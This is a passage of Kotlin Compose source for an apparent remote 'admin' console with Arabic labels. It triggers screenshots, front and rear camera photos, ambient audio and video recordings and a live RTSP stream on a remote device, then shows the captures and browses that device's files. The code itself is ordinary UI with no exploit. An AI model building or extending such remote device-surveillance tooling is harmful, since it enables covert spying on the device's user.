                        val mediaSource = RtspMediaSource.Factory()
                            .setForceUseRtpTcp(true)
                            .setTimeoutMs(3000)
                            .createMediaSource(mediaItem)
                        setMediaSource(mediaSource)
                    } else {
                        setMediaItem(mediaItem)
                    }
                    playWhenReady = true
                    prepare()
                }
            }

            DisposableEffect(exoPlayer) {
                onDispose {
                    exoPlayer.release()
                }
            }

            AndroidView(
                factory = { ctx ->
                    PlayerView(ctx).apply {
                        player = exoPlayer
                        useController = false
                        resizeMode = androidx.media3.ui.AspectRatioFrameLayout.RESIZE_MODE_FIT
                    }
                },
                modifier = Modifier.fillMaxSize()
            )
        }

        // Top toggle bar overlay for high flexibility
        Row(
            modifier = Modifier
                .align(androidx.compose.ui.Alignment.TopStart)
                .padding(8.dp)
                .background(Color.Black.copy(alpha = 0.75f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
                .padding(horizontal = 4.dp, vertical = 4.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Button(
                onClick = { playerType = "native" },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (playerType == "native") Color(0xFF9155FF) else Color.Transparent,
                    contentColor = Color.White
                ),
                shape = androidx.compose.foundation.shape.RoundedCornerShape(6.dp),
                contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                modifier = Modifier.height(28.dp)
            ) {
                Text("Native H.264", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.width(4.dp))
            Button(
                onClick = { playerType = "web" },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (playerType == "web") Color(0xFF9155FF) else Color.Transparent,
                    contentColor = Color.White
                ),
                shape = androidx.compose.foundation.shape.RoundedCornerShape(6.dp),
                contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                modifier = Modifier.height(28.dp)
            ) {
                Text("Web JMuxer", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.width(4.dp))
            Button(
                onClick = { playerType = "exo" },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (playerType == "exo") Color(0xFF9155FF) else Color.Transparent,
                    contentColor = Color.White
                ),
                shape = androidx.compose.foundation.shape.RoundedCornerShape(6.dp),
                contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp),
                modifier = Modifier.height(28.dp)
            ) {
                Text("ExoPlayer", fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun DeviceMediaGalleryTab(viewModel: AdminViewModel) {
    val allMedia by viewModel.allMediaFiles.collectAsState()

    val categories = listOf(
        "لقطات الشاشة" to "take_screenshot",
        "الكاميرا الأمامية" to "take_photo_front",
        "الكاميرا الخلفية" to "take_photo_back",
        "التسجيلات الصوتية" to "record_audio",
        "تسجيلات الفيديو" to "record_video_front" // Or we combine front and back if preferred, wait let's use both? The prompt says "تسجيلات الفيديو (record_video)" so we use "record_video" or front and back.
    )

    var selectedTab by remember { mutableIntStateOf(0) }
    
    // We group tabs to commands:
    val selectedCommandSource = categories[selectedTab].second
    
    val currentTabItems = allMedia.filter { item ->
        if (selectedCommandSource == "record_video_front") {
            item.commandSource == "record_video" || item.commandSource == "record_video_front" || item.commandSource == "record_video_back"
        } else if (selectedCommandSource == "take_screenshot") {
            item.commandSource == "take_screenshot" || item.commandSource == "screenshot"
        } else {
            item.commandSource == selectedCommandSource
        }
    }.sortedByDescending { it.timestamp }

    var expandedMedia by remember { mutableStateOf<MediaItem?>(null) }
    val context = LocalContext.current

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        ScrollableTabRow(
            selectedTabIndex = selectedTab,
            containerColor = Color.White,
            contentColor = Color(0xFF9155FF),
            edgePadding = 8.dp,
            modifier = Modifier.clip(RoundedCornerShape(12.dp))
        ) {
            categories.forEachIndexed { index, (label, _) ->
                Tab(
                    selected = selectedTab == index,
                    onClick = { selectedTab = index },
                    modifier = Modifier.padding(vertical = 12.dp, horizontal = 4.dp)
                ) {
                    Text(
                        text = label, 
                        color = if (selectedTab == index) Color(0xFF9155FF) else Color(0xFF6B7280),
                        fontWeight = if (selectedTab == index) FontWeight.Bold else FontWeight.Normal,
                        fontSize = 13.sp
                    )
                }
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))

        // Request button for the current active category
        Row(modifier = Modifier.fillMaxWidth()) {
            when (categories[selectedTab].second) {
                "take_screenshot" -> {
                    Button(onClick = { viewModel.runCommand("take_screenshot") }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))) {
                        Icon(Icons.Default.Screenshot, null, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("التقاط شاشة", fontSize = 13.sp)
                    }
                }
                "take_photo_front" -> {
                    Button(onClick = { viewModel.requestPhoto(true) }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF))) {
                        Icon(Icons.Default.CameraFront, null, tint = Color.Black, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("التقاط صورة كاميرا أمامية", color = Color.Black, fontSize = 13.sp)
                    }
                }
                "take_photo_back" -> {
                    Button(onClick = { viewModel.requestPhoto(false) }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636))) {
                        Icon(Icons.Default.CameraRear, null, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("التقاط صورة كاميرا خلفية", fontSize = 13.sp)
                    }
                }
                "record_audio" -> {
                    Button(onClick = { viewModel.requestAudioRecord() }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9100))) {
                        Icon(Icons.Default.Mic, null, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("تسجيل مقطع صوتي", fontSize = 13.sp)
                    }
                }
                "record_video_front" -> {
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
                        Button(onClick = { viewModel.requestVideo(true) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE91E63))) {
                            Text("فيديو أمامي", fontSize = 12.sp)
                        }
                        Button(onClick = { viewModel.requestVideo(false) }, modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F))) {
                            Text("فيديو خلفي", fontSize = 12.sp)
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Content Display
        Box(modifier = Modifier.weight(1f)) {
            if (currentTabItems.isEmpty()) {
                EmptyMediaNotice("لا توجد وسائط متوفرة حالياً في هذا القسم")
            } else {
                when (categories[selectedTab].second) {
                    "record_audio" -> {
                        LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                            items(currentTabItems) { item -> AudioListCard(item) { expandedMedia = it } }
                        }
                    }
                    else -> {
                        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                            items(currentTabItems) { item -> 
                                val isVideoItem = item.commandSource.contains("video", ignoreCase = true) || item.type.contains("video", ignoreCase = true)
                                if (isVideoItem) {
                                    GalleryVideoCard(item) { expandedMedia = it }
                                } else {
                                    GalleryImageCard(item) { expandedMedia = it }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Modal for Expanded View & Playback
    if (expandedMedia != null) {
        Dialog(onDismissRequest = { expandedMedia = null }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
            Box(modifier = Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.9f)).padding(16.dp), contentAlignment = Alignment.Center) {
                // Determine layout by commandSource loosely or by type
                val isVideo = expandedMedia!!.commandSource.contains("video", ignoreCase = true) || expandedMedia!!.type.contains("video", ignoreCase = true)
                val isAudio = expandedMedia!!.commandSource.contains("audio", ignoreCase = true) || expandedMedia!!.type.contains("audio", ignoreCase = true)

                
                when {
                    isVideo -> {
                        ExoPlayerVideoView(mediaItem = expandedMedia!!)
                    }
                    isAudio -> {
                        AudioPlayerView(mediaItem = expandedMedia!!)
                    }
                    else -> { // Image/Screenshot
                        var scale by remember { mutableFloatStateOf(1f) }
                        var offset by remember { mutableStateOf(androidx.compose.ui.geometry.Offset.Zero) }
                        val state = rememberTransformableState { zoomChange, offsetChange, _ ->
                            scale = (scale * zoomChange).coerceIn(1f, 5f)
                            offset += offsetChange
                        }
                        if (expandedMedia!!.url.isNotEmpty()) {
                            AsyncImage(
                                model = ImageRequest.Builder(context).data(expandedMedia!!.url).crossfade(true).build(),
                                contentDescription = null,
                                modifier = Modifier
                                    .fillMaxSize()
                                    .graphicsLayer(
                                        scaleX = scale,
                                        scaleY = scale,
                                        translationX = offset.x,
                                        translationY = offset.y
                                    )
                                    .transformable(state),
                                contentScale = ContentScale.Fit
                            )
                        } else {
                            val bmp = expandedMedia!!.toBitmap()
                            if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize().graphicsLayer(scaleX = scale, scaleY = scale, translationX = offset.x, translationY = offset.y).transformable(state), contentScale = ContentScale.Fit)
                            else Text("خطأ في فك تشفير الصورة", color = Color.White)
                        }
                    }
                }
                
                IconButton(onClick = { expandedMedia = null }, modifier = Modifier.align(Alignment.TopStart).padding(top = 24.dp)) {
                    Icon(Icons.Default.Close, null, tint = Color.White)
                }
            }
        }
    }
}

@Composable
fun EmptyMediaNotice(message: String) {
    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.CloudOff, contentDescription = null, tint = Color(0xFFD1D5DB), modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(8.dp))
            Text(message, color = Color(0xFF9CA3AF), fontSize = 14.sp)
        }
    }
}

@Composable
fun GalleryImageCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().aspectRatio(1f).clickable { onClick(item) }) {
        Box(modifier = Modifier.fillMaxSize()) {
            if (item.url.isNotEmpty()) {
                AsyncImage(model = item.url, contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
            } else {
                val bmp = item.toBitmap()
                if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
                else Box(modifier = Modifier.fillMaxSize().background(Color.Gray))
            }
            Box(modifier = Modifier.align(Alignment.BottomStart).fillMaxWidth().background(Brush.verticalGradient(listOf(Color.Transparent, Color.Black))).padding(6.dp)) {
                Text(formatter.format(Date(item.timestamp)), color = Color.White, fontSize = 9.sp)
            }
        }
    }
}

@Composable
fun GalleryVideoCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().aspectRatio(1f).clickable { onClick(item) }) {
        Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
            Icon(Icons.Default.PlayCircleOutline, contentDescription = "تشغيل", tint = Color.White, modifier = Modifier.align(Alignment.Center).size(36.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape))
            Box(modifier = Modifier.align(Alignment.BottomStart).fillMaxWidth().background(Brush.verticalGradient(listOf(Color.Transparent, Color.Black))).padding(6.dp)) {
                Text(formatter.format(Date(item.timestamp)), color = Color.White, fontSize = 9.sp)
            }
        }
    }
}

@Composable
fun AudioListCard(item: MediaItem, onClick: (MediaItem) -> Unit) {
    val formatter = remember { SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US) }
    Card(shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth().clickable { onClick(item) }, colors = CardDefaults.cardColors(containerColor = Color.White)) {
        Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(modifier = Modifier.size(40.dp).clip(CircleShape).background(Color(0xFFFF9100).copy(alpha = 0.1f)), contentAlignment = Alignment.Center) {
                Icon(Icons.Default.PlayArrow, contentDescription = null, tint = Color(0xFFFF9100))
            }
            Spacer(modifier = Modifier.width(12.dp))
            Column {
                Text(if (item.type == "audio_record") "مقطع محيطي مسجل" else "تسجيل صوتي", color = Color(0xFF111827), fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                Text(formatter.format(Date(item.timestamp)), color = Color(0xFF6B7280), fontSize = 11.sp)
            }
        }
    }
}

@Composable
fun ExoPlayerVideoView(mediaItem: MediaItem) {
    val context = LocalContext.current
    var exoPlayer by remember { mutableStateOf<ExoPlayer?>(null) }
    if (mediaItem.url.isEmpty()) {
        Text("خطأ: رابط الملف غير متوفر أو فارغ. (Base64 Video Not Supported Here)", color = Color.White, modifier = Modifier.padding(16.dp))
        return
    }
    DisposableEffect(Unit) {
        val player = ExoPlayer.Builder(context).build().apply {
            setMediaItem(androidx.media3.common.MediaItem.fromUri(mediaItem.url))
            prepare()
            playWhenReady = true
        }
        exoPlayer = player
        onDispose { player.release() }
    }
    AndroidView(
        factory = { ctx ->
            PlayerView(ctx).apply {
                this.player = exoPlayer
                useController = true
                layoutParams = android.view.ViewGroup.LayoutParams(
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                    android.view.ViewGroup.LayoutParams.MATCH_PARENT
                )
            }
        },
        modifier = Modifier.fillMaxSize()
    )
}

@Composable
fun AudioPlayerView(mediaItem: MediaItem) {
    val context = LocalContext.current
    var exoPlayer by remember { mutableStateOf<ExoPlayer?>(null) }
    var isPlaying by remember { mutableStateOf(false) }
    var duration by remember { mutableLongStateOf(0L) }
    var currentPosition by remember { mutableLongStateOf(0L) }

    if (mediaItem.url.isEmpty()) {
        Text("خطأ: رابط الملف الصوتي غير متوفر.", color = Color.White, modifier = Modifier.padding(16.dp))
        return
    }

    DisposableEffect(Unit) {
        val player = ExoPlayer.Builder(context).build().apply {
            setMediaItem(androidx.media3.common.MediaItem.fromUri(mediaItem.url))
            prepare()
            addListener(object : androidx.media3.common.Player.Listener {
                override fun onIsPlayingChanged(isPlayingNow: Boolean) {
                    isPlaying = isPlayingNow
                }
                override fun onPlaybackStateChanged(playbackState: Int) {
                    if (playbackState == androidx.media3.common.Player.STATE_READY) {
                        duration = this@apply.duration.coerceAtLeast(0L)
                    }
                }
            })
            playWhenReady = true
        }
        exoPlayer = player
        onDispose { player.release() }
    }

    LaunchedEffect(exoPlayer, isPlaying) {
        while (isPlaying && exoPlayer != null) {
            currentPosition = exoPlayer!!.currentPosition.coerceAtLeast(0L)
            delay(500L)
        }
    }

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(24.dp),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White)
    ) {
        Column(
            modifier = Modifier.padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(
                imageVector = Icons.Default.Audiotrack,
                contentDescription = null,
                tint = Color(0xFF9155FF),
                modifier = Modifier
                    .size(64.dp)
                    .background(Color(0xFFF3E8FF), CircleShape)
                    .padding(16.dp)
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text("تسجيل صوتي", color = Color(0xFF111827), fontSize = 18.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(24.dp))

            androidx.compose.material3.Slider(
                value = if (duration > 0) currentPosition.toFloat() / duration else 0f,
                onValueChange = { percent ->
                    if (duration > 0) {
                        val newPos = (percent * duration).toLong()
                        currentPosition = newPos
                        exoPlayer?.seekTo(newPos)
                    }
                },
                modifier = Modifier.fillMaxWidth(),
                colors = androidx.compose.material3.SliderDefaults.colors(
                    thumbColor = Color(0xFF9155FF),
                    activeTrackColor = Color(0xFF9155FF),
                    inactiveTrackColor = Color(0xFFE5E7EB)
                )
            )
            
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text(formatDuration(currentPosition), color = Color.Gray, fontSize = 12.sp)
                Text(formatDuration(duration), color = Color.Gray, fontSize = 12.sp)
            }

            Spacer(modifier = Modifier.height(16.dp))

            IconButton(
                onClick = {
                    if (isPlaying) exoPlayer?.pause() else exoPlayer?.play()
                },
                modifier = Modifier
                    .size(56.dp)
                    .background(Color(0xFF9155FF), CircleShape)
            ) {
                Icon(
                    imageVector = if (isPlaying) Icons.Default.Pause else Icons.Default.PlayArrow,
                    contentDescription = if (isPlaying) "إيقاف مؤقت" else "تشغيل",
                    tint = Color.White,
                    modifier = Modifier.size(32.dp)
                )
            }
        }
    }
}

fun formatDuration(timeMs: Long): String {
    if (timeMs < 0) return "00:00"
    val totalSeconds = timeMs / 1000
    val minutes = totalSeconds / 60
    val seconds = totalSeconds % 60
    return String.format(java.util.Locale.US, "%02d:%02d", minutes, seconds)
}

@Composable
fun DeviceFilesExplorerTab(viewModel: AdminViewModel) {
    val currentPath by viewModel.currentPath.collectAsState()
    val files by viewModel.deviceFiles.collectAsState()
    val isLoading by viewModel.isFilesLoading.collectAsState()

    // Add this to make sure we load initially if files is empty
    LaunchedEffect(currentPath) {
        if (files.isEmpty()) {
            viewModel.exploreDirectory(currentPath)
        }
    }

    Column(modifier = Modifier.fillMaxSize().background(Color.Transparent)) {
        // Content wrapped in SwipeToRefreshBox
        SwipeToRefreshBox(
            isRefreshing = isLoading,
            onRefresh = { viewModel.loadDeviceFileMap() },
            modifier = Modifier.weight(1f).fillMaxWidth()
        ) {
            if (isLoading && files.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        CircularProgressIndicator(color = Color(0xFF9155FF))
                        Spacer(modifier = Modifier.height(12.dp))
                        Text("جاري استكشاف المجلد...", color = Color.Gray, fontSize = 14.sp)
                    }
                }
            } else if (files.isEmpty()) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .verticalScroll(rememberScrollState()),
                    contentAlignment = Alignment.Center
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.HourglassEmpty, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(64.dp))
                        Spacer(modifier = Modifier.height(16.dp))
                        Text("المجلد فارغ أو لم يتم جلبه بعد", color = Color.Gray, fontSize = 16.sp)
                        Spacer(modifier = Modifier.height(8.dp))
                        Text("اسحب للأسفل للتحديث أو اضغط على تحديث في الأعلى", color = Color.LightGray, fontSize = 12.sp)
                    }
                }
            } else {
                LazyColumn(
                    modifier = Modifier.fillMaxSize(),
                    contentPadding = PaddingValues(start = 16.dp, end = 16.dp, top = 8.dp, bottom = 100.dp), // Extra padding for the floating navigation bar
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    items(files.sortedWith(compareBy({ !it.is_directory }, { it.file_name.lowercase() }))) { file ->
                        FileExplorerItem(file = file) { clickedFile ->
                            if (clickedFile.is_directory) {
                                val nextPath = if (currentPath == "/") "/${clickedFile.file_name}" else "$currentPath/${clickedFile.file_name}"
                                viewModel.exploreDirectory(nextPath)
                            } else {
                                // Can show some actions here in future
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun FileExplorerItem(file: DeviceFile, onClick: (DeviceFile) -> Unit) {
    val kbSize = file.size_bytes / 1024
    val sizeStr = if (file.is_directory) "" else if (kbSize > 1024) "${kbSize / 1024} MB" else "$kbSize KB"
    
    val iconVec = if (file.is_directory) Icons.Default.Folder else when(file.icon_category?.lowercase()) {
        "image" -> Icons.Default.Image
        "video" -> Icons.Default.Movie
        "audio" -> Icons.Default.Audiotrack
        "archive" -> Icons.Default.Archive
        "document" -> Icons.Default.Article
        else -> Icons.Default.InsertDriveFile
    }

    val iconTint = if (file.is_directory) Color(0xFFFBBF24) else Color(0xFF9155FF)
    
    Card(
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp),
        modifier = Modifier.fillMaxWidth().clickable { onClick(file) }
    ) {
        Row(
            modifier = Modifier.padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier.size(48.dp).clip(RoundedCornerShape(12.dp)).background(iconTint.copy(alpha = 0.1f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(iconVec, contentDescription = null, tint = iconTint, modifier = Modifier.size(24.dp))
            }
            Spacer(modifier = Modifier.width(16.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = file.file_name,
                    color = Color(0xFF111827),
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Medium,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
                if (file.last_modified.isNotEmpty() || sizeStr.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(4.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        if (!file.is_directory) {
                            Text(sizeStr, color = Color(0xFF6B7280), fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
                            Spacer(modifier = Modifier.width(8.dp))
                        }
                        Text(file.last_modified.take(10), color = Color(0xFF9CA3AF), fontSize = 11.sp)
                    }
                }
            }
            
            if (file.is_directory) {
                Icon(Icons.Default.ArrowForwardIos, contentDescription = null, tint = Color(0xFFD1D5DB), modifier = Modifier.size(16.dp))
            }
        }
    }
}